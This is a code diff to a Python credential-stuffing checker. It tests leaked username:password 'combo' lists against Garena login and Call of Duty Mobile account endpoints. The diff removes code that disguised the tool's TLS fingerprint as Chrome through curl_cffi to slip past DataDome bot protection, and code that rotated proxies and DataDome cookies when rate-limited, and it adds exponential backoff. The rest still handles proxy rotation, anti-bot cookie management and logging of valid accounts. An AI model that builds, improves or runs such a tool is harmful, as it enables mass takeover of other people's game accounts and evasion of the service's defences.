@@ -16,7 +16,6 @@ def _auto_install():
         ("requests",     "requests"),
         ("Crypto",       "pycryptodome"),
         ("rich",         "rich"),
-        ("curl_cffi",    "curl_cffi"),
     ]
 
     missing = []
@@ -76,38 +75,6 @@ import colorama
 from colorama import Fore as _F, Style as _S
 import requests
 from Crypto.Cipher import AES
-
-# Chrome-impersonating HTTP client for the datadome-guarded prelogin call.
-# Regular `requests` sends a python TLS ClientHello that datadome fingerprints
-# and RSTs after a few hits, which surfaces as a flood of ConnectionError /
-# Timeout rows ("Network Error"). curl_cffi runs the same request with a real
-# chrome TLS/ja3 so the fingerprint check passes.
-try:
-    from curl_cffi import requests as _cffi_requests
-    _CFFI_OK = True
-except Exception:
-    _cffi_requests = None
-    _CFFI_OK = False
-
-_cffi_tls = threading.local()
-
-def _get_cffi_session():
-    """Per-thread curl_cffi session impersonating Chrome 124.
-
-    One session per worker thread so the TLS ctx is reused across accounts
-    without cross-thread contention.
-    """
-    if not _CFFI_OK:
-        return None
-    s = getattr(_cffi_tls, 'session', None)
-    if s is None:
-        try:
-            s = _cffi_requests.Session(impersonate='chrome124')
-            _cffi_tls.session = s
-        except Exception:
-            _cffi_tls.session = None
-            return None
-    return s
 
 from rich import print as rprint
 from rich.console import Console
@@ -2283,35 +2250,7 @@ def prelogin(session, account, datadome_manager, cookie_manager, retries=6, prox
             if cookie_header:
                 headers['cookie'] = cookie_header
             _to = 8 if (proxy_manager and proxy_manager.is_loaded()) else 5
-            # Route the datadome-guarded prelogin through curl_cffi with a
-            # Chrome TLS fingerprint so the anti-bot layer doesn't RST it.
-            # Cookies are mirrored in via the explicit cookie header built
-            # above, and any new datadome from the response is lifted back
-            # onto the requests session below so the rest of the flow is
-            # untouched. Fall back to the plain requests session if cffi
-            # didn't import.
-            cffi = _get_cffi_session() if _CFFI_OK else None
-            if cffi is not None:
-                _proxy = None
-                if hasattr(session, 'proxies') and session.proxies:
-                    _proxy = session.proxies.get('https') or session.proxies.get('http')
-                response = cffi.get(
-                    url,
-                    headers=headers,
-                    params=params,
-                    timeout=_to,
-                    proxies={'http': _proxy, 'https': _proxy} if _proxy else None,
-                    allow_redirects=True,
-                )
-                # Mirror response cookies back onto the requests session so
-                # the rest of the pipeline (login, init, CODM) stays intact.
-                try:
-                    for _ck_name, _ck_val in response.cookies.items():
-                        session.cookies.set(_ck_name, _ck_val, domain='.garena.com')
-                except Exception:
-                    pass
-            else:
-                response = session.get(url, headers=headers, params=params, timeout=_to)
+            response = session.get(url, headers=headers, params=params, timeout=_to)
             if response.status_code == 403:
                 if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
@@ -2329,30 +2268,7 @@ def prelogin(session, account, datadome_manager, cookie_manager, retries=6, prox
                 all_403 = True
                 break
             if response.status_code == 429:
-                # rate-limited: rotate the throttled identity instead of waiting on it
-                rotated = False
-                if proxy_manager and proxy_manager.is_loaded():
-                    session.proxies.clear()
-                    session.proxies.update(proxy_manager.get_next())
-                    rotated = True
-                else:
-                    picked_ck = cookie_manager.pick_cookie()
-                    if picked_ck:
-                        applyck(session, picked_ck)
-                        val = extract_datadome_token(picked_ck)
-                        if val:
-                            datadome_manager.set_datadome(val)
-                            datadome_manager.set_session_datadome(session, val)
-                        rotated = True
-                    else:
-                        proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
-                        fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
-                        if fresh_dd:
-                            datadome_manager.set_datadome(fresh_dd)
-                            datadome_manager.set_session_datadome(session, fresh_dd)
-                            rotated = True
-                if not rotated:
-                    time.sleep(0.1)
+                time.sleep(0.2)
                 continue
             response.raise_for_status()
             if _is_fake_response(response):
@@ -2987,7 +2903,7 @@ def save_game_folder(account, password, account_data, game_connections, base_dir
         pass
 
 
-def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None, defer_transient=False):
+def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
     max_retries = 4
     attempt = 0
     _tried_cached = False
@@ -3037,46 +2953,31 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     datadome_manager.clear_session_datadome(session)
                     return 'IP_CHANGED'
                 else:
-                    # IP never changed — rate-limiting, not an account verdict.
-                    # Silently return IP_BLOCKED so _wrapped_worker can skip it
-                    # without pushing noise into the feed; account stays in the
-                    # combo file for a re-run.
-                    return 'IP_BLOCKED'
+                    live_stats.update_stats(is_error=True)
+                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
+                    results_manager.add_account(account_data)
+                    if auto_remove:
+                        _queue_auto_remove(account, password, file_manager, combo_file_path)
+                    return 'ERROR'
 
             if v1 == 'NETWORK_ERROR':
-                # Silent retry. Rebuild the session (dead keep-alive / stale socket
-                # is the common cause) and rotate datadome/proxy, then retry a bit
-                # longer than the default so a flaky connection resolves itself.
-                if attempt < max_retries + 2:
-                    try:
-                        session.close()
-                    except Exception:
-                        pass
-                    session = _make_session()
-                    init_ga_cookies(session)
-                    datadome_manager.clear_session_datadome(session)
+                if attempt < max_retries:
+                    backoff = min(2 ** attempt, 30) + random.uniform(0, 2)
                     if proxy_manager and proxy_manager.is_loaded():
                         try:
+                            session.proxies.clear()
                             session.proxies.update(proxy_manager.get_next())
                         except Exception:
                             pass
-                    # Try a fresh datadome cookie too — banned one shows as reset.
-                    try:
-                        picked_ck = cookie_manager.pick_cookie()
-                        if picked_ck:
-                            applyck(session, picked_ck)
-                            val = extract_datadome_token(picked_ck)
-                            if val:
-                                datadome_manager.set_datadome(val)
-                                datadome_manager.set_session_datadome(session, val)
-                    except Exception:
-                        pass
-                    time.sleep(random.uniform(0.2, 0.6))
+                    # [suppressed] network error backoff print
+                    time.sleep(backoff)
                     continue
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
                 live_stats.push_result(success=False, error_reason='Network Error')
+                if auto_remove:
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
 
             if v1 == 'NO_ACCOUNT':
@@ -3116,6 +3017,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Prelogin Failed'}
                 results_manager.add_account(account_data)
                 live_stats.push_result(success=False, error_reason='Prelogin Failed')
+                if auto_remove:
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
 
             if new_datadome:
@@ -3123,10 +3026,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 datadome_manager.set_session_datadome(session, new_datadome)
 
             sso_key = login(session, account, password, v1, v2)
-
+                
             if not sso_key:
-                # Real wrong-password hits are already caught upstream (ERROR_AUTH
-                # branch / error_auth JSON). A None here with no explicit auth
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                 live_stats.update_stats(valid=False)
                 results_manager.add_account(err_data)
@@ -3172,22 +3073,22 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         proxy_manager.report_failure(_cur_proxy, is_403=True)
                 if datadome_manager.handle_403(session):
                     if attempt < max_retries:
-                        # Stale datadome on a flipped IP — handle_403 refreshed it
-                        # and the new IP is live, so retry fast, no long backoff.
-                        time.sleep(random.uniform(0.1, 0.4))
+                        backoff = min(2 ** attempt, 60) + random.uniform(0, 3)
+                        # [suppressed] 403 backoff print
+                        time.sleep(backoff)
                         continue
-                # 403 after datadome refresh exhausted — service rejecting us.
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
                 if auto_remove:
                     _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
-
+            
             try:
                 account_data_json = response.json()
             except json.JSONDecodeError:
                 if attempt < max_retries:
+                    # [suppressed] invalid response retry print
                     time.sleep(0.2)
                     continue
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
@@ -3239,21 +3140,16 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             
             from concurrent.futures import ThreadPoolExecutor as _TPE
             with _TPE(max_workers=2) as _inner_ex:
-                # CODM check — reuse a warm per-thread session (keep-alive),
-                # reset only the auth cookies and mirror the main proxy.
+                # CODM check (uses a fresh session to avoid cookie bleed)
                 def _do_codm():
-                    cs = _get_codm_session()
-                    cs.cookies.clear()
+                    cs = requests.Session()
                     for cn in ['sso_key', 'apple_state_key', 'datadome']:
                         if cn in session.cookies:
                             cs.cookies.set(cn, session.cookies.get(cn), domain='.garena.com')
                     try:
-                        cs.proxies.clear()
-                        if session.proxies:
-                            cs.proxies.update(session.proxies)
-                    except Exception:
-                        pass
-                    return check_codm_account(cs, account)
+                        return check_codm_account(cs, account)
+                    finally:
+                        cs.close()
                 
                 codm_fut = _inner_ex.submit(_do_codm)
                 
@@ -3404,7 +3300,9 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
             if attempt < max_retries:
-                time.sleep(random.uniform(0.1, 0.4))
+                backoff = min(2 ** attempt, 60) + random.uniform(0, 2)
+                # [suppressed] connection/timeout backoff print
+                time.sleep(backoff)
                 continue
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
             live_stats.update_stats(is_error=True)
@@ -3412,7 +3310,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if auto_remove:
                 _queue_auto_remove(account, password, file_manager, combo_file_path)
             return 'ERROR'
-
+            
         except Exception as e:
             if attempt < max_retries:
                 time.sleep(0.2)
@@ -3462,11 +3360,6 @@ def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
                     continue
                 return (None, None, None)
             if resp.status_code == 429:
-                # rate-limited: swap in a fresh datadome token so the retry isn't throttled
-                fresh = get_datadome_cookie(session)
-                if fresh:
-                    datadome_manager.set_datadome(fresh)
-                    datadome_manager.set_session_datadome(session, fresh)
                 continue
             resp.raise_for_status()
             if _is_fake_response(resp):
